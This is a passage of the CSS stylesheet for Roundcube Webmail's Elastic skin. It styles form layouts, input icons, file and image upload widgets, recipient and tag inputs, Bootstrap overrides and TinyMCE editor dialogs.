 .formcontent:not(.popupmenu) {
   padding: 1rem;
 }
 .formcontent .row {
   margin-right: 0;
   margin-left: 0;
 }
 .formcontent .row .col,
 .formcontent .row .col-2,
 .formcontent .row .col-4,
 .formcontent .row .col-6,
 .formcontent .row .col-8,
 .formcontent .row .col-10,
 .formcontent .row .col-12,
 .formcontent .row .col-sm,
 .formcontent .row .col-sm-2,
 .formcontent .row .col-sm-4,
 .formcontent .row .col-sm-6,
 .formcontent .row .col-sm-8,
 .formcontent .row .col-sm-10,
 .formcontent .row .col-sm-12 {
   padding: 0;
 }
 .formcontent .row .form-control-plaintext,
 .formcontent .row label.col-form-label {
   padding: 5px 5px 5px 0;
 }
 .formcontent .row .form-control-plaintext {
   padding-bottom: 0;
   border: 0;
 }
 @media screen and (max-width: 576px) {
   .formcontent .row.form-group > td label {
     padding-bottom: 0;
   }
 }
 .formcontent .row.form-check {
   padding: 0;
   display: flex;
   flex-wrap: nowrap;
 }
 @media screen and (max-width: 576px) {
   .formcontent .row.form-check .col-6 {
     max-width: 100%;
     flex: auto;
   }
   .formcontent .row.form-check > *:last-child {
     width: 1%;
     min-width: 2.6rem;
   }
   .formcontent .row.form-check.with-link > *:last-child {
     min-width: 8rem;
   }
 }
 .formcontent .row.form-check .form-check-input {
   margin: 0.5rem 0;
 }
 .formcontent .row.form-check .custom-switch + a {
   line-height: 2;
   vertical-align: bottom;
 }
 .formcontent .row.form-check td > label {
   padding-bottom: 0;
 }
 .formcontent .nav-tabs {
   margin-bottom: 1rem;
 }
 .formcontent .nav-tabs:empty {
   display: none;
 }
 .formcontent .hint {
   font-style: italic;
   color: #737677;
 }
 .formcontent.raweditor {
   height: 100%;
 }
 .formcontent.raweditor form {
   height: 100%;
 }
 .formcontent.raweditor textarea {
   font-family: monospace;
   height: 100%;
 }
 .formcontent.raweditor .CodeMirror {
   border: 1px solid #ced4da;
   border-radius: 0.3rem;
   height: 100%;
   color: #2c363a;
 }
 .formcontent.raweditor .CodeMirror-focused {
   border-color: #0099cc;
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.25);
 }
 .formcontent.raweditor .CodeMirror-linebackground.line-error {
   background-color: #EC1313;
   opacity: 0.4;
 }
 .formcontent.raweditor .errorGutter {
   width: 0.8em;
 }
 @media screen and (max-width: 320px) {
   .formcontent .col-form-label {
     flex: auto;
     max-width: 100%;
   }
   .formcontent .col-6,
   .formcontent .col-8,
   .formcontent .col-10 {
     flex: auto;
     max-width: 100%;
   }
 }
 /* Some common icons for "iconized inputs" */
 .input-group .icon {
   text-decoration: none;
   padding: 5px 0.5rem;
 }
 .input-group .icon.input-group-text {
   min-width: 2.4rem;
 }
 .input-group .icon:before {
   margin: 0 !important;
   line-height: 1;
   font-size: 1.1em;
 }
 .input-group .icon.user:before {
   content: "\f007";
 }
 .input-group .icon.pass:before {
   content: "\f023";
 }
 .input-group .icon.host:before {
   content: "\f015";
 }
 .input-group .icon.language.before {
   content: "\f0ac";
 }
 .input-group .icon.cancel:before {
   content: "\f00d";
 }
 .input-group .icon.delete:before {
   content: "\f2ed";
 }
 .input-group .icon.edit:before {
   content: "\f303";
 }
 .input-group .icon.add:before {
   content: "\f067";
 }
 .input-group .icon.add.recipient:before {
   content: "\f0c0";
 }
 .input-group .icon.search:before {
   content: "\f002";
 }
 .input-group .icon.filter:before {
   content: "\f0b0";
 }
 .input-group .icon.key:before {
   content: "\f084";
 }
 .input-group .icon .inner {
   display: none;
 }
 .input-group a:focus {
   background-color: rgba(0, 153, 204, 0.25);
   outline: 0;
 }
 .proplist {
   margin-bottom: 0;
   padding: 0;
 }
 .proplist li {
   list-style-type: none;
   line-height: 2rem;
   margin-bottom: 0.25rem;
   display: flex;
   align-items: center;
 }
 .proplist li:last-child {
   margin-bottom: 0;
 }
 .proplist li input[type=radio] {
   margin-right: 0.5em;
 }
 .proplist li input[type=radio]:disabled + label {
   opacity: 0.5;
 }
 .proplist li label:not(.input-group-text) {
   margin: 0;
   line-height: 2rem;
 }
 .proplist li select {
   width: auto;
   display: inline;
 }
 .checklist > div {
   line-height: 2rem;
   display: block;
 }
 .checklist .custom-control-label:before,
 .checklist .custom-control-label:after {
   margin: calc(2px * -1) 0 0 0;
 }
 .checklist > div + br {
   display: none;
 }
 /*** Forms in popups ***/
 .popup form.propform {
   padding: 0.25rem;
   overflow-x: hidden;
 }
 .popupmenu.form.nolist {
   padding: 0 0.5rem;
 }
 .popupmenu.form ul {
   list-style-type: none;
   padding: 0;
   margin: 0;
 }
 .popupmenu.form li:not(.separator) {
   padding: 0 1rem;
 }
 .popupmenu.form li:not(.separator) label {
   margin: 0;
   line-height: 35px;
 }
 .popupmenu.form li:not(.separator) label input {
   margin-right: 0.5rem;
 }
 .popupmenu.form input {
   vertical-align: middle;
 }
 .popupmenu.form select {
   margin: 0.5rem 0;
 }
 .popupmenu.form .buttons {
   text-align: center;
   padding: 0.5rem;
 }
 /*** Smart list (multiple input) field ***/
 .multi-input > .content {
   max-height: 11.65em;
   overflow: hidden;
   overflow-y: auto;
   border-radius: 0.25rem;
   border: 1px solid #ced4da;
 }
 .multi-input > .content.focused {
   border-color: #0099cc;
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.25);
 }
 .multi-input a.icon.reset:before {
   content: "\f2ed";
 }
 .multi-input input.form-control {
   padding-left: 0.75rem;
   height: auto;
 }
 .multi-input input,
 .multi-input input:focus,
 .multi-input .input-group-text {
   border-radius: 0;
   border: 0;
   border-bottom: 1px solid #ced4da;
   box-shadow: none;
 }
 .multi-input .input-group-text {
   border-left: 1px solid #ced4da;
 }
 .multi-input .input-group-append {
   margin-left: 0;
 }
 .multi-input .input-group {
   margin: 0 !important;
   flex-wrap: nowrap;
 }
 .multi-input .input-group:last-child * {
   border-bottom: 0;
 }
 .multi-input + .btn {
   margin-top: 0.5rem;
 }
 .multi-input.is-invalid > .content {
   border: 1px solid #EC1313;
 }
 .multi-input.is-invalid > .content.focused {
   border-color: #EC1313;
   box-shadow: 0 0 0 0.2rem rgba(236, 19, 19, 0.25);
 }
 .multi-input.is-invalid > .invalid-feedback {
   display: inline-block;
 }
 /*** Files upload widget with list of files, upload form and drop area ***/
 .file-upload {
   padding: 1rem 1rem 12rem;
   margin: 0 1rem 0.25rem 1rem;
   border-radius: 0.5rem;
   border: 0.2rem dashed #d4dbde;
 }
 fieldset .file-upload {
   margin: 0;
 }
 .file-upload .upload-form {
   text-align: center;
   padding-bottom: 1em;
 }
 .file-upload .upload-form a.btn,
 .file-upload .upload-form button {
   margin-bottom: 0.25rem;
 }
 .file-upload .hint {
   margin-bottom: 0.5rem;
   color: #737677;
   text-align: center;
 }
 .file-upload .attachmentslist {
   border: 0;
   background: transparent;
 }
 .file-upload .attachmentslist li {
   position: relative;
   display: flex;
   padding-right: 1.5em;
   margin: 0.15em 0;
 }
 .file-upload .attachmentslist li a.filename {
   flex: 1;
 }
 .file-upload .attachmentslist li a.delete,
 .file-upload .attachmentslist li a.cancelupload {
   position: absolute;
   right: 0.25em;
   width: auto;
 }
 .file-upload .attachmentslist li a.dropdown {
   margin-right: 0.5em;
 }
 .file-upload .attachmentslist li .inner {
   display: none;
 }
 .file-upload.droptarget {
   padding-bottom: 0.5rem !important;
 }
 .file-upload.droptarget:after {
   content: url("data:image/svg+xml;charset=utf-8,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%20960%20560%22%3E%0A%3Cpath%20fill%3D%22%23d4dbde%22%20d%3D%22M690%20245c0%209.2-3.5%2017.9-10.1%2024.9l-175%20175c-6.6%206.6-15.3%2010.1-24.9%2010.1-9.2%200-18.4-3.5-24.9-10.1l-175-175c-6.6-7-10.1-15.8-10.1-24.9%200-4.4.9-9.2%202.6-13.6C277.9%20218.3%20291%20210%20305%20210h87.5V35c0-19.2%2015.8-35%2035-35h105c19.2%200%2035%2015.8%2035%2035v175H655c14%200%2027.1%208.3%2032.4%2021.4%201.7%204.4%202.6%209.2%202.6%2013.6zm0%20245H270V350h-70v140c0%2038.5%2031.5%2070%2070%2070h420c38.5%200%2070-31.5%2070-70V350h-70v140z%22%2F%3E%0A%3C%2Fsvg%3E%0A");
   width: 10rem;
   margin: 5rem auto 0 auto;
   display: block;
 }
 .file-upload.droptarget.active {
   border-color: #82a9be;
 }
 .file-upload.droptarget.hover {
   border-color: #82a9be;
   background-color: #c5d7e1;
 }
 /*** Smart recipient input field ***/
 .recipient-input {
   display: flex;
   flex-wrap: wrap;
   padding: 0 0.75rem 4px 0.75rem;
   list-style-type: none;
   cursor: text;
   height: auto;
 }
 .recipient-input.focus {
   border-color: #0099cc;
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.25);
 }
 .recipient-input .recipient {
   display: flex;
   position: relative;
   max-width: 50%;
   border: 1px solid #ced4da;
   background-color: #f1f3f4;
   border-radius: 0.25em;
   padding: 0 0.25em;
   margin-top: 4px;
   margin-right: 0.2em;
   white-space: nowrap;
   cursor: default;
 }
 @media screen and (max-width: 450px) {
   .recipient-input .recipient {
     width: 100%;
     max-width: 100%;
   }
 }
 .recipient-input .name {
   overflow: hidden;
   text-overflow: ellipsis;
   flex-grow: 1;
   display: inline-block;
   line-height: 1.1;
   padding: 3px;
   vertical-align: middle;
 }
 .recipient-input .email {
   text-indent: -5000rem;
   display: inline-block;
   width: 0;
 }
 .recipient-input .quotes {
   position: absolute;
   width: 0;
   opacity: 0;
 }
 .recipient-input a.button.icon {
   font-size: 0.8em;
   cursor: pointer;
   padding: 0;
 }
 .recipient-input a.button.icon:before {
   float: none;
   display: inline-block;
   width: 1em;
   margin: 0;
   line-height: 1.5;
 }
 .recipient-input li {
   max-width: 100%;
 }
 .recipient-input input {
   width: 40px;
   max-width: 100%;
   background: transparent !important;
   border: 0 !important;
   margin-top: 4px;
   outline: 0;
   line-height: 1.5;
 }
 .recipient-input input::-ms-clear {
   display: none;
 }
 /*** Tagedit widget (from jqueryui plugin) ***/
 .tagedit-list {
   display: flex;
   flex-wrap: wrap;
   padding: 0 0.75rem 4px 0.75rem;
   margin: 0;
   list-style-type: none;
   min-height: 2.3rem;
 }
 .tagedit-list + .placeholder {
   display: none;
 }
 .tagedit-list[tabindex="-1"] {
   border-color: #0099cc;
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.25);
 }
 .tagedit-list li.tagedit-listelement-new {
   margin-top: 4px;
 }
 .tagedit-list li.tagedit-listelement-new input {
   width: 15px;
   background: transparent !important;
   border: 0;
   outline: 0;
   margin: 0;
   padding: 0;
   line-height: 1.5;
 }
 .tagedit-list li.tagedit-listelement-new input.tagedit-input-disabled {
   visibility: hidden;
 }
 .tagedit-list li.tagedit-listelement-old {
   max-width: 50%;
   border: 1px solid #ced4da;
   background-color: #f1f3f4;
   border-radius: 0.25em;
   margin-top: 4px;
   margin-right: 0.2em;
   white-space: nowrap;
 }
 .tagedit-list li.tagedit-listelement-old a {
   font-size: 0.8em;
   cursor: pointer;
   display: inline-block;
   width: 1.1em;
   overflow: hidden;
   vertical-align: middle;
   margin-right: 0.2rem;
 }
 .tagedit-list li.tagedit-listelement-old a:before {
   content: "\f00d";
   width: 1em;
   line-height: 1.2;
 }
 .tagedit-list li.tagedit-listelement-old span {
   overflow: hidden;
   text-overflow: ellipsis;
   flex-grow: 1;
   display: inline-block;
   line-height: 1.4;
   padding: 0 0.25rem;
   vertical-align: middle;
 }
 /*** Skin selection widget ***/
 .skinselection {
   white-space: nowrap;
   display: table-row;
 }
 .skinselection > span {
   display: table-cell;
   vertical-align: middle;
   padding: 0.1em 0.5em;
   white-space: normal;
 }
 .skinselection > span:last-child {
   padding-right: 0;
 }
 .skinselection .skinitem input {
   width: auto;
 }
 .skinselection .skinname {
   font-weight: bold;
 }
 .skinselection .skinlicense,
 .skinselection .skinlicense a {
   font-style: italic;
   text-decoration: none;
 }
 .skinselection .skinlicense a:hover {
   text-decoration: underline;
 }
 .skinselection .skinlicense,
 .skinselection .skinauthor {
   font-size: 90%;
 }
 .skinselection .skinthumbnail {
   width: 64px;
   height: 64px;
   border: 1px solid #ced4da;
   background: #fff;
   border-radius: 4px;
 }
 /*** Percent input with jQuery-UI slider ***/
 .input-percent-slider {
   display: flex;
   align-items: center;
 }
 .input-percent-slider input {
   max-width: 4em;
 }
 .input-percent-slider span.label {
   line-height: 2.4;
   padding: 0 0.5rem 0 0.25rem;
 }
 .input-percent-slider div.ui-slider {
   flex: 1;
   margin: 0 0.5em;
 }
 /*** Image upload widget ***/
 .image-upload {
   position: relative;
   overflow: hidden;
   cursor: pointer;
   background-color: #f4f4f4;
 }
 .image-upload a.button {
   display: none;
   position: absolute;
   left: 0;
   top: 0;
   background-color: rgba(255, 255, 255, 0.85);
   border-radius: 5px;
   width: 2.5em;
   padding: 0.5em;
   margin: 0.5em;
   line-height: 1;
 }
 .image-upload.changed a.button {
   display: inline;
 }
 .input-group-combo select:first-of-type.alone {
   border-radius: 0.25rem !important;
 }
 .input-group-combo select:first-of-type:not(.alone) {
   flex: unset;
   width: auto;
 }
 .input-group-combo .input-group {
   padding: 0 !important;
   flex: 2;
 }
 .input-group-combo select + select,
 .input-group-combo .input-group :first-child {
   border-top-left-radius: 0;
   border-bottom-left-radius: 0;
 }
 /*** General browser hacks ***/
 @-moz-document url-prefix() {
   select:-moz-focusring {
     color: transparent !important;
     text-shadow: 0 0 0 #2c363a !important;
   }
 }
 /*** Bootstrap style overrides and improvements ***/
 .form-control {
   color: #2c363a;
 }
 .form-control:focus {
   color: #2c363a;
   border-color: #0099cc;
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.25);
 }
 .form-control.is-invalid {
   border-color: #EC1313;
   box-shadow: none;
 }
 .form-control.is-invalid:focus {
   border-color: #EC1313;
   box-shadow: 0 0 0 0.2rem rgba(236, 19, 19, 0.25);
 }
 .form-control::placeholder {
   color: #bbb;
 }
 .form-control::-ms-input-placeholder,
 .form-control::-webkit-input-placeholder {
   color: #bbb;
 }
 .invalid-feedback {
   color: #EC1313;
   font-size: 90%;
 }
 .form-group {
   margin-bottom: 0.5rem;
 }
 .input-group-text {
   color: #2c363a;
   background-color: #f1f3f4;
 }
 .input-group-text input:focus {
   z-index: 1;
   border-color: #0099cc !important;
 }
 .custom-switch {
   padding-left: 0;
   display: inline-block;
 }
 .custom-switch .custom-control-input {
   left: 0;
 }
 .custom-switch .custom-control-input:focus ~ .custom-control-label:before {
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.25);
 }
 .custom-switch .custom-control-input:focus:not(:checked) ~ .custom-control-label::before {
   border-color: #0099cc;
 }
 .custom-switch .custom-control-input:checked ~ .custom-control-label::before {
   border-color: #0099cc;
   background-color: #0099cc;
 }
 .custom-switch .custom-control-input:checked:disabled ~ .custom-control-label::before {
   border-color: #1ac6ff;
   background-color: #1ac6ff;
 }
 .custom-switch .custom-control-label {
   padding-left: 2.5rem;
   min-height: 2rem;
   line-height: 2;
   display: inline-block;
 }
 html.touch .custom-switch .custom-control-label {
   padding-left: 3rem;
 }
 .custom-switch .custom-control-label:before,
 .custom-switch .custom-control-label:after {
   border-radius: 0.6rem;
   margin: 2px 0;
 }
 html.touch .custom-switch .custom-control-label:before,
 html.touch .custom-switch .custom-control-label:after {
   border-radius: 0.8rem;
   margin: 0;
 }
 .custom-switch .custom-control-label:before {
   left: 2px;
   top: 4px;
   width: 26px;
   height: 16px;
 }
 html.touch .custom-switch .custom-control-label:before {
   top: 2px;
   width: 35px;
   height: 22px;
 }
 .custom-switch .custom-control-label:after {
   left: 4px;
   top: 6px;
   width: 12px;
   height: 12px;
 }
 html.touch .custom-switch .custom-control-label:after {
   top: 4px;
   height: 18px;
   width: 18px;
 }
 .custom-switch .custom-control-input:checked ~ .custom-control-label::after {
   transform: translateX(10px);
 }
 html.touch .custom-switch .custom-control-input:checked ~ .custom-control-label::after {
   transform: translateX(13px);
 }
 .custom-switch .custom-control-input:not(:disabled) ~ .custom-control-label:after,
 .custom-switch .custom-control-input:not(:disabled) ~ .custom-control-label:before {
   cursor: pointer;
 }
 .custom-file {
   display: block;
 }
 .custom-file .custom-file-label {
   white-space: nowrap;
   overflow: hidden;
   text-overflow: ellipsis;
   padding-right: 100px;
   line-height: 1.5 !important;
 }
 .custom-file + .hint {
   margin-top: 3px;
 }
 .custom-file-input:focus ~ .custom-file-label {
   border-color: #0099cc;
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.25);
 }
 /**
  * Roundcube Webmail styles for the Elastic skin
  *
  * Copyright (c) The Roundcube Dev Team
  *
  * The contents are subject to the Creative Commons Attribution-ShareAlike
  * License. It is allowed to copy, distribute, transmit and to adapt the work
  * by keeping credits to the original authors in the README.md file.
  * See http://creativecommons.org/licenses/by-sa/3.0/ for details.
  */
 /*** Text Editor widget (and TinyMCE editor) ***/
 .mce-tinymce.mce-container.mce-panel {
   border-radius: 0.25rem;
   border-color: #ced4da;
   overflow: hidden;
 }
 .mce-tinymce .mce-btn,
 .mce-tinymce .mce-panel {
   background-color: #f1f3f4;
 }
 .mce-tinymce .mce-panel {
   border-color: #ced4da;
 }
 .mce-top-part::before,
 .mce-tinymce,
 .mce-window {
   box-shadow: none !important;
 }
 .mce-btn.mce-active {
   background: #8b9fa7 !important;
 }
 .mce-window.mce-container {
   border: 0;
 }
 .mce-window.mce-container :not(.mce-ico) {
   font-family: Roboto, sans-serif;
 }
 .mce-window .mce-reset {
   background: #fff;
 }
 .mce-window .mce-container-body.mce-abs-layout {
   overflow: unset;
 }
 .mce-window .mce-container-body .mce-abs-end {
   display: none;
 }
 .mce-window .mce-window-head {
   height: 58px;
   border-bottom: 1px solid #ddd;
   padding: 0;
 }
 .mce-window .mce-window-head .mce-title {
   line-height: 58px;
   font-size: 1.25rem;
   padding: 0 3rem 0 1rem;
   color: #2c363a;
 }
 .mce-window .mce-window-head .mce-close {
   border: 0;
   color: #2c363a;
   background: transparent;
   right: 0;
   top: 0;
   position: absolute;
   height: 57.3px;
   width: 1.25em;
   margin: 0.25rem;
   padding: 0.1rem 0.75rem;
   cursor: pointer;
 }
 .mce-window .mce-window-head .mce-close:before {
   content: "\f00d";
   margin: 0;
 }
 .mce-window .mce-window-head .mce-close i {
   display: none;
 }
 .mce-window .mce-foot {
   border: 0;
   height: 58px !important;
   position: relative;
 }
 @media screen and (max-width: 480px) {
   .mce-window .mce-foot {
     border-top: 1px solid #ddd;
   }
 }
 .mce-window .mce-foot .mce-container-body {
   height: 100% !important;
   display: flex;
   align-items: center;
   justify-content: flex-end;
 }
 .mce-window .mce-foot .mce-container-body .mce-btn {
   position: initial;
   margin-right: 0.5rem;
   line-height: 1;
   width: auto !important;
   height: auto !important;
 }
 .mce-window .mce-foot .mce-container-body .mce-btn:last-child {
   margin-right: 1rem;
 }
 .mce-window .mce-foot .mce-container-body .mce-btn .mce-txt {
   line-height: 1.5;
   vertical-align: unset;
 }
 .mce-window .mce-foot .mce-container-body .mce-btn button:before {
   display: inline;
   float: none;
   vertical-align: middle;
   margin-right: 0.4rem;
 }
 .mce-window .mce-foot .mce-container-body .mce-abs-end {
   position: initial;
   width: 1rem;
   order: 9;
 }
 .mce-window .mce-foot .mce-btn {
   color: #fff;
   background: #8b9fa7;
   border-color: #8b9fa7;
   border-radius: 0.3rem;
   border-color: transparent;
 }
 .mce-window .mce-foot .mce-btn:focus {
   box-shadow: 0 0 0 0.2rem rgba(139, 159, 167, 0.5);
 }
 .mce-window .mce-foot .mce-btn:hover {
   background: #7c939c;
   border-color: #778e98;
 }
 .mce-window .mce-foot .mce-btn.disabled,
 .mce-window .mce-foot .mce-btn:disabled {
   background: #c5cfd3;
   border-color: #c5cfd3;
   opacity: 1;
 }
 .mce-window .mce-foot .mce-btn:not(:disabled):not(.disabled):active,
 .mce-window .mce-foot .mce-btn:not(:disabled):not(.disabled).active {
   background: #6e8791;
   border-color: #6a828b;
 }
 .mce-window .mce-foot .mce-btn:not(:disabled):not(.disabled):active:focus,
 .mce-window .mce-foot .mce-btn:not(:disabled):not(.disabled).active:focus {
   box-shadow: 0 0 0 0.2rem rgba(139, 159, 167, 0.53);
 }
 .mce-window .mce-foot .mce-btn:focus {
   border-color: transparent !important;
   color: #fff;
   background: #8b9fa7;
 }
 .mce-window .mce-foot .mce-btn.mce-primary {
   color: #fff;
   background: #0099cc;
   border-color: #0099cc;
 }
 .mce-window .mce-foot .mce-btn.mce-primary:focus {
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.5);
 }
 .mce-window .mce-foot .mce-btn.mce-primary:hover {
   background: #0086b3;
   border-color: #007ea8;
 }
 .mce-window .mce-foot .mce-btn.mce-primary.disabled,
 .mce-window .mce-foot .mce-btn.mce-primary:disabled {
   background: #33ccff;
   border-color: #33ccff;
   opacity: 1;
 }
 .mce-window .mce-foot .mce-btn.mce-primary:not(:disabled):not(.disabled):active,
 .mce-window .mce-foot .mce-btn.mce-primary:not(:disabled):not(.disabled).active {
   background: #007399;
   border-color: #006b8f;
 }
 .mce-window .mce-foot .mce-btn.mce-primary:not(:disabled):not(.disabled):active:focus,
 .mce-window .mce-foot .mce-btn.mce-primary:not(:disabled):not(.disabled).active:focus {
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.53);
 }
 .mce-window .mce-foot .mce-btn button:hover,
 .mce-window .mce-foot .mce-btn button {
   color: #fff;
   padding: 0.5rem 0.75rem;
 }
 .mce-window .mce-foot .mce-btn:last-child button:before {
   content: "\f00d";
 }
 .mce-window .mce-foot .mce-btn.mce-primary button:before {
   content: "\f00c";
 }
 .mce-window .mce-foot .mce-search-foot div:nth-of-type(2) button:before {
   content: "\f002";
 }
 .mce-window .mce-foot .mce-search-foot div:nth-of-type(3) button:before,
 .mce-window .mce-foot .mce-search-foot div:nth-of-type(4) button:before {
   content: "\f303";
 }
 .mce-window .mce-foot .mce-search-foot div:nth-of-type(6) button:before {
   content: "\f053";
 }
 .mce-window .mce-foot .mce-search-foot div:nth-of-type(7) button:before {
   content: "\f054";
 }
 .mce-window .mce-foot .mce-search-foot div:nth-of-type(7) button:after {
   display: inline;
   float: none;
   margin: 0 0 0 0.2rem;
   content: "\f054";
 }
 @media screen and (min-width: 481px) {
   .mce-window .mce-foot .mce-search-foot div:nth-of-type(6) {
     margin-left: 0.5rem;
   }
   .mce-window .mce-foot .mce-search-foot div:nth-of-type(7) button:before {
     display: none;
   }
 }
 .mce-window .mce-formitem {
   min-width: 450px;
   position: unset !important;
 }
 .mce-window .mce-formitem > .mce-container-body {
   margin-bottom: 0.5rem;
 }
 .mce-window .mce-formitem > .mce-container-body > * {
   width: 75% !important;
   position: unset !important;
 }
 .mce-window .mce-formitem > .mce-container-body > label {
   max-width: 25%;
   min-width: 25%;
   line-height: 2.5 !important;
 }
 .mce-window .mce-formitem .mce-widget {
   border-radius: 0.25rem;
 }
 .mce-window .mce-form {
   padding: 1rem;
   box-sizing: border-box;
 }
 .mce-window .mce-form .mce-form {
   padding: 0;
   position: unset !important;
   width: 100% !important;
 }
 .mce-window .mce-form .mce-form > .mce-container-body {
   flex-wrap: wrap;
   height: auto !important;
 }
 .mce-window .mce-form .mce-form .mce-formitem {
   min-width: 100%;
   width: 100% !important;
 }
 .mce-window .mce-form .mce-container {
   height: auto !important;
 }
 .mce-window .mce-form .mce-container .mce-container-body {
   display: flex;
   height: auto !important;
 }
 .mce-window .mce-form .mce-container .mce-container-body > input:not([size="5"]) {
   position: relative;
   left: 0 !important;
   flex: 1;
 }
 .mce-window .mce-form > .mce-container-body {
   box-sizing: border-box;
   width: 100% !important;
 }
 .mce-window .mce-form .mce-form-split .mce-formitem {
   min-width: auto;
 }
 .mce-window .mce-form .mce-form-split .mce-formitem > .mce-container-body {
   width: 100% !important;
 }
 .mce-window .mce-form label {
   position: unset;
   line-height: 2.5 !important;
   height: auto !important;
 }
 .mce-window .mce-colorpicker + .mce-form {
   width: 150px !important;
   padding: 0;
 }
 .mce-window .mce-colorpicker + .mce-form .mce-formitem {
   min-width: unset;
 }
 .mce-window .mce-colorpicker + .mce-form .mce-formitem + :not(.mce-formitem) {
   height: 50px !important;
 }
 .mce-window .mce-textbox {
   padding: 0.375rem 0.75rem !important;
   line-height: 1.5;
   color: #2c363a;
 }
 .mce-window .mce-textbox:not(textarea) {
   height: auto !important;
 }
 .mce-window .mce-textbox:focus {
   color: #2c363a;
   border-color: #0099cc;
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.25);
 }
 .mce-window .mce-textbox[size="5"] {
   width: auto !important;
 }
 .mce-window .mce-textbox.mce-multiline {
   line-height: 1.25;
   width: 100% !important;
   position: unset;
   box-sizing: border-box;
   display: block;
 }
 .mce-window .mce-listbox button {
   line-height: 1.5;
   padding: 0.375rem 0.75rem;
 }
 .mce-window .mce-listbox:focus {
   border-color: #0099cc !important;
   box-shadow: 0 0 0 0.2rem rgba(0, 153, 204, 0.25) !important;
 }
 .mce-window .mce-checkbox {
   line-height: 2.5;
 }
 .mce-window .mce-checkbox i.mce-i-checkbox {
   border: 0;
   width: auto;
   color: #0099cc;
   text-indent: 0;
 }
 .mce-window .mce-checkbox i.mce-i-checkbox:before {
   margin: 0;
   content: "\f204";
 }
 .mce-window .mce-checkbox.mce-checked i.mce-i-checkbox:before {
   content: "\f205";
 }
 .mce-window .mce-checkbox:focus i.mce-i-checkbox {
   border: 0;
 }
 .mce-window .mce-combobox {
   display: flex;
 }
 .mce-window .mce-combobox input {
   border-radius: 0.3rem 0 0 0.3rem;
   flex: 1;
 }
 .mce-window .mce-combobox input:focus {
   z-index: 1;
 }
 .mce-window .mce-combobox.mce-combobox-fake input {
   border-radius: 0.3rem;
 }
 .mce-window .mce-combobox button {
   padding: 0.4rem 0.6rem;
 }
 .mce-window .mce-combobox .mce-btn {
   border-radius: 0 0.3rem 0.3rem 0;
   background: #f1f3f4;
 }
 .mce-window .mce-combobox .mce-btn:focus {
   background-color: rgba(0, 153, 204, 0.25);
   border-color: #c5c5c5;
 }
 .mce-window .mce-tabs {
   padding-top: 1rem;
   margin: 0 1rem;
   border-color: #d4dbde;
 }
 .mce-window .mce-tabs .mce-tab {
   border-radius: 0.25rem 0.25rem 0 0;
   padding: 0.5rem 1rem;
   height: auto !important;
   border: 1px solid transparent;
   color: #0099cc;
   background: transparent;
   margin-bottom: -1px;
 }
 .mce-window .mce-tabs .mce-tab.mce-active {
   border: 1px solid #d4dbde;
   border-bottom-color: #fff;
   color: #2c363a !important;
 }
 .mce-window .mce-tabs .mce-tab:not(.mce-active):hover {
   border: 1px solid #f1f3f4;
   border-bottom-color: transparent;
   border-bottom: 0;
 }
 .mce-window .mce-tabs .mce-tab:focus {
   outline: unset !important;
 }
 .mce-window .mce-label {
   text-shadow: none;
   color: #2c363a;
 }
 .mce-menu,
 .mce-floatpanel.mce-popover {
   box-shadow: 3px 3px 5px #f1f3f4 !important;
   border-color: #d4dbde !important;
   border-radius: 0.3rem;
 }
 .mce-menu .mce-menu-item.mce-active {
   color: #fff;
   background-color: #0099cc;
 }
 .mce-menu .popover-header {
   display: none !important;
 }
 div.mce-menubtn.mce-opened {
   z-index: 65530 !important;
 }
 #mce-modal-block.mce-in {
   background-color: rgba(44, 54, 58, 0.5);
   opacity: 1 !important;
 }
 @media screen and (max-width: 480px) {
   .mce-window {
     width: 100% !important;
     height: 100% !important;
     left: 0 !important;
     top: 0 !important;
     border-width: 0 !important;
   }
   .mce-window > .mce-reset {
     display: flex;
     flex-direction: column;
     height: 100%;
   }
   .mce-window .mce-window-body {
     flex: 1;
     overflow-y: auto !important;
   }
   .mce-window > .mce-reset > div,
   .mce-window .mce-container-body {
     width: 100% !important;
   }
   .mce-window .mce-window-head {
     background-color: #cfdee6;
   }
   .mce-window .mce-window-head .mce-title {
     font-size: 1rem;
     text-align: center;
     padding: 0 1rem;
   }
   .mce-window .mce-window-head .mce-close {
     display: none;
   }
   .mce-window .mce-foot {
     background-color: #cfdee6;
   }
   .mce-window .mce-foot .mce-container-body {
     justify-content: space-evenly;
   }
   .mce-window .mce-foot .mce-container-body .mce-btn {
     position: initial;
     height: 100% !important;
     margin: 0;
     background: transparent;
     border-width: 0;
   }
   .mce-window .mce-foot .mce-container-body .mce-btn:focus {
     box-shadow: none;
   }
   .mce-window .mce-foot .mce-container-body .mce-btn:hover {
     background: transparent;
   }
   .mce-window .mce-foot .mce-container-body .mce-btn:last-child {
     margin: 0;
   }
   .mce-window .mce-foot .mce-container-body .mce-btn button {
     color: #2c363a;
     padding: 0.45rem;
     font-size: 0.9rem;
   }
   .mce-window .mce-foot .mce-container-body .mce-btn button:before {
     display: block;
     float: none;
     width: 100%;
     margin: 0;
     line-height: 1.75;
     height: 1.75rem;
   }
   .mce-window .mce-foot .mce-container-body .mce-abs-end {
     display: none;
   }
   .mce-window .mce-foot .mce-search-foot div:nth-of-type(7) button:after {
     display: none;
   }
   .mce-window .mce-form,
   .mce-window .mce-form + .mce-container,
   .mce-window .mce-formitem,
   .mce-window .mce-combobox,
   .mce-window .mce-panel:not(.mce-popover) {
     width: 100% !important;
   }
   .mce-window .mce-formitem {
     min-width: unset;
   }
   .mce-window .mce-form > .mce-container-body {
     display: flex;
     flex-direction: column;
     left: 0;
     right: 0;
     box-sizing: border-box;
   }
   .mce-window .mce-form .mce-container-body {
     height: auto !important;
     flex-direction: column;
   }
   .mce-window .mce-form .mce-container-body > label {
     position: unset !important;
     width: 100% !important;
     max-width: 100%;
   }
   .mce-window .mce-form .mce-container-body > label + * {
     position: unset !important;
     width: auto !important;
   }
   .mce-window .mce-form .mce-container-body > .mce-checkbox {
     position: absolute;
     left: 0 !important;
     top: 3rem !important;
   }
